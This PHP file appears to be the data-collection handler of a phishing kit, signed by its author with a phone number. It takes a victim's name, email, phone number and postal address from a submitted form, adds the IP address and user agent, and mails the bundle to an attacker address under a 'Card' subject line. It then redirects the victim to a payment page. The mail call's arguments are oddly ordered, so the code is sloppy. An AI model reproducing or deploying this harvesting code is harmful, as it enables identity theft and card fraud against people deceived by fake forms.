<?php
if($_POST["fname"] != "" and $_POST["email"] != "" and $_POST["pn"] != "" and $_POST["address"] != "" and $_POST["city"] != "" and $_POST["state"] != "" and $_POST["zip"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Bluekitty Info-----------------------\n";
$message .= "FullName            : ".$_POST['fname']."\n";
$message .= "Email Address            : ".$_POST['email']."\n";
$message .= "Phone Number            : ".$_POST['pn']."\n";
$message .= "Address            : ".$_POST['address']."\n";
$message .= "City            : ".$_POST['city']."\n";
$message .= "State            : ".$_POST['state']."\n";
$message .= "Zip Code           : ".$_POST['zip']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$message .= "|----------- Created by Buck(+234-9092126538 ICQ) --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);
}
$praga=rand();
$praga=md5($praga);
  header ("Location: pay.php");
}else{
header ("Location: pay.php");
}

?>
